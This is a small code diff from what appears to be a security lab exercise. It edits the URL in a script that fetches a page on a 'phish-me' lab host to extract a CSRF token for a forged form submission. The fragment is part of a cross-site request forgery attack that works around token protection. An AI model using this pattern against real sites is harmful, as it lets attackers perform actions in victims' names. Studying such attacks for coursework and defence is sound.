@@ -7,7 +7,7 @@
 </form>
 <script>
 // Fetch the CSRF token dynamically (e.g., from the page or an endpoint)
-fetch('https://phish-me.quoccacorp.com/') // Adjust this to the page or endpoint that contains the token
+fetch('https://phish-me.quoccacorp.com') // Adjust this to the page or endpoint that contains the token
     .then(response => response.text())
     .then(data => {
         // Extract the token from the response (e.g., using regex or DOM parsing)
